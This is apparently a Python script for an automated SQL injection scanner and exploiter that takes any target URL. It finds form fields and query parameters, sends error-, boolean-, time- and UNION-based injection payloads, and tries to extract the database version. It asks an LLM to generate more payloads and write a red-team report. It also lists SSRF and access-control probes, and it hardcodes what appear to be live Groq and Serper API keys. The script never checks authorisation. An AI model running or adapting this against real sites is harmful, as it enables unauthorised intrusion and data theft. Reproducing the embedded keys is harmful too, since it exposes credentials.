import os
import json
import requests
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from bs4 import BeautifulSoup
from openai import OpenAI

# ---------- CONFIG ----------
GROQ_API_KEY = os.getenv("GROQ_API_KEY") or "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"
SERPER_API_KEY = os.getenv("SERPER_API_KEY") or "98de95d9f23cfe0ee068a1ff872f3d93074f2255"

_cache = {}
client = OpenAI(base_url="https://api.groq.com/openai/v1", api_key=GROQ_API_KEY)

# ---------- DISCOVER INJECTION POINTS ----------
def discover_injection_points(target_url: str) -> list:
    points = []
    try:
        resp = requests.get(target_url, timeout=10)
        soup = BeautifulSoup(resp.text, "html.parser")
        for form in soup.find_all("form"):
            method = form.get("method", "get").upper()
            action = form.get("action", "")
            url = action if action.startswith("http") else target_url.rstrip("/") + "/" + action.lstrip("/")
            inputs = form.find_all("input")
            data = {}
            for inp in inputs:
                name = inp.get("name")
                if name:
                    data[name] = ""
            if data:
                points.append({"method": method, "url": url, "data": data, "param": None})
        parsed = urlparse(target_url)
        if parsed.query:
            query_params = parse_qs(parsed.query)
            for key in query_params.keys():
                points.append({"method": "GET", "url": target_url, "data": None, "param": key})
        if not points:
            common_endpoints = ["/login", "/admin", "/search", "/api"]
            for ep in common_endpoints:
                points.append({"method": "POST", "url": target_url.rstrip("/") + ep, "data": {"username": "", "password": ""}, "param": None})
    except Exception as e:
        points.append({"method": "POST", "url": target_url, "data": {"username": "", "password": ""}, "param": None})
    return points

# ---------- SEND REQUEST ----------
def send_payload(injection_point: dict, payload: str) -> dict:
    method = injection_point.get("method", "GET")
    url = injection_point["url"]
    data = injection_point.get("data")
    param = injection_point.get("param")
    try:
        if method == "GET" and param:
            parsed = urlparse(url)
            query_dict = parse_qs(parsed.query)
            query_dict[param] = payload
            new_query = urlencode(query_dict, doseq=True)
            new_url = urlunparse(parsed._replace(query=new_query))
            start = time.time()
            resp = requests.get(new_url, timeout=10, allow_redirects=False)
            elapsed = time.time() - start
            return {"status_code": resp.status_code, "response_text": resp.text[:2000], "time": elapsed, "error": None}
        elif method == "POST" and data:
            post_data = data.copy()
            for key in post_data.keys():
                post_data[key] = payload
                break
            start = time.time()
            resp = requests.post(url, data=post_data, timeout=10, allow_redirects=False)
            elapsed = time.time() - start
            return {"status_code": resp.status_code, "response_text": resp.text[:2000], "time": elapsed, "error": None}
        else:
            start = time.time()
            resp = requests.get(f"{url}?q={payload}", timeout=10, allow_redirects=False)
            elapsed = time.time() - start
            return {"status_code": resp.status_code, "response_text": resp.text[:2000], "time": elapsed, "error": None}
    except Exception as e:
        return {"status_code": 0, "response_text": "", "time": 0, "error": str(e)}

# ---------- AI GENERATES PAYLOADS ----------
def ai_generate_payloads(target_url: str, vuln_type: str, num_payloads: int = 10) -> list:
    cache_key = f"payloads_{target_url}_{vuln_type}"
    if cache_key in _cache:
        return _cache[cache_key]
    prompt = f"""Generate {num_payloads} high‑impact payloads for {vuln_type} on {target_url}. Include:
- Error‑based (e.g., ' OR 1=1 --)
- Boolean‑based (e.g., ' AND 1=1 -- and ' AND 1=2 --)
- Time‑based (e.g., ' AND SLEEP(5) --)
- UNION‑based (e.g., ' UNION SELECT null,null --)
- Obfuscated (encoding, comments)
Return ONLY a JSON array of strings. No explanation."""
    try:
        response = client.chat.completions.create(
            model="llama-3.1-8b-instant",
            messages=[
                {"role": "system", "content": "You are a security expert. Return only valid JSON."},
                {"role": "user", "content": prompt}
            ],
            temperature=0.7
        )
        raw = response.choices[0].message.content.strip()
        start = raw.find('[')
        end = raw.rfind(']') + 1
        if start != -1 and end != 0:
            payloads = json.loads(raw[start:end])
        else:
            payloads = [raw]
        _cache[cache_key] = payloads
        return payloads
    except Exception as e:
        return get_fallback_payloads(vuln_type)

# ---------- FALLBACK PAYLOADS ----------
def get_fallback_payloads(vuln_type: str) -> list:
    fallbacks = {
        "SQL Injection": [
            "' OR '1'='1' --",
            "' AND '1'='1' --",
            "' AND '1'='2' --",
            "' AND SLEEP(5) --",
            "' UNION SELECT null,null,null --",
            "' OR 1=1 --",
            "admin' --",
            "' OR 'x'='x' --"
        ],
        "Broken Access Control": ["/admin", "/dashboard?user=admin", "JWT tampered"],
        "SSRF": ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:8080"]
    }
    return fallbacks.get(vuln_type, ["test"])

# ---------- REAL EXPLOIT ENGINE ----------
def exploit_sqli(injection_point: dict) -> dict:
    """
    Performs real SQL injection exploitation with:
    - Error‑based detection
    - Boolean‑based blind
    - Time‑based blind
    - UNION‑based data extraction
    Returns: {"vulnerable": bool, "technique": str, "extracted": str, "evidence": dict}
    """
    base_payloads = [
        ("' OR '1'='1' --", "error_based"),
        ("' AND '1'='1' --", "boolean_true"),
        ("' AND '1'='2' --", "boolean_false"),
        ("' AND SLEEP(5) --", "time_based"),
        ("' UNION SELECT null,null,null --", "union")
    ]
    results = {}
    for payload, technique in base_payloads:
        resp = send_payload(injection_point, payload)
        if resp["error"]:
            continue
        status = resp["status_code"]
        text = resp["response_text"].lower()
        elapsed = resp["time"]
        # Error‑based detection
        if technique == "error_based" and (status == 500 or "sql" in text or "error" in text):
            return {"vulnerable": True, "technique": "error_based", "extracted": None, "evidence": {"status": status, "snippet": text[:200]}}
        # Boolean‑based blind
        if technique == "boolean_true":
            # Compare with boolean_false response later
            results["boolean_true"] = {"status": status, "text": text, "time": elapsed}
        if technique == "boolean_false":
            results["boolean_false"] = {"status": status, "text": text, "time": elapsed}
        # Time‑based blind
        if technique == "time_based" and elapsed > 4:
            return {"vulnerable": True, "technique": "time_based", "extracted": None, "evidence": {"sleep": elapsed}}
        # UNION – try to extract database
        if technique == "union" and "table" not in text and "error" not in text:
            # If response is different, it might be vulnerable
            # Try to extract version or user
            version_payload = "' UNION SELECT @@version, null,null --"
            resp2 = send_payload(injection_point, version_payload)
            if resp2["error"] is None and resp2["status_code"] == 200:
                # Check if we see version string
                if "mysql" in resp2["response_text"].lower() or "mariadb" in resp2["response_text"].lower():
                    return {"vulnerable": True, "technique": "union_extract", "extracted": resp2["response_text"][:500], "evidence": {"version": resp2["response_text"][:200]}}
    
    # Boolean blind comparison
    if "boolean_true" in results and "boolean_false" in results:
        if results["boolean_true"]["status"] != results["boolean_false"]["status"] or results["boolean_true"]["text"] != results["boolean_false"]["text"]:
            return {"vulnerable": True, "technique": "boolean_blind", "extracted": None, "evidence": {"true_response": results["boolean_true"]["text"][:100], "false_response": results["boolean_false"]["text"][:100]}}
    
    return {"vulnerable": False, "technique": None, "extracted": None, "evidence": None}

# ---------- MAIN ORCHESTRATOR (REAL EXPLOIT) ----------
def generate_threat_analysis(target_url: str, vuln_type: str) -> str:
    # Discover injection points
    injection_points = discover_injection_points(target_url)
    if not injection_points:
        return "Error: No injection points found."

    all_exploits = []
    any_success = False

    for point in injection_points:
        if vuln_type == "SQL Injection":
            result = exploit_sqli(point)
            if result["vulnerable"]:
                any_success = True
                all_exploits.append({
                    "point": point,
                    "vulnerability": "SQL Injection",
                    "technique": result["technique"],
                    "extracted": result.get("extracted"),
                    "evidence": result["evidence"]
                })
        # Add other vuln types (BAC, SSRF) with similar exploit functions here

    # Generate final red team report
    if any_success:
        summary = f"✅ Exploit successful on {target_url} for {vuln_type}. Techniques: {', '.join([e['technique'] for e in all_exploits])}. Extracted data: {all_exploits[0].get('extracted', 'N/A')}."
        # Use AI to write a detailed report
        prompt = f"Write a detailed red team report. Vulnerability: {vuln_type}. Target: {target_url}. Exploits: {json.dumps(all_exploits, indent=2)}. Include impact and remediation."
        try:
            response = client.chat.completions.create(
                model="llama-3.1-8b-instant",
                messages=[
                    {"role": "system", "content": "You are a senior security consultant."},
                    {"role": "user", "content": prompt}
                ],
                temperature=0.3
            )
            report = response.choices[0].message.content.strip()
        except:
            report = summary
    else:
        report = f"❌ No vulnerabilities found for {vuln_type} on {target_url} after probing {len(injection_points)} injection points. Consider manual testing."

    # Store exploit results for status
    global _last_exploit_success
    _last_exploit_success = any_success
    return report

_last_exploit_success = False
def get_last_exploit_success():
    return _last_exploit_success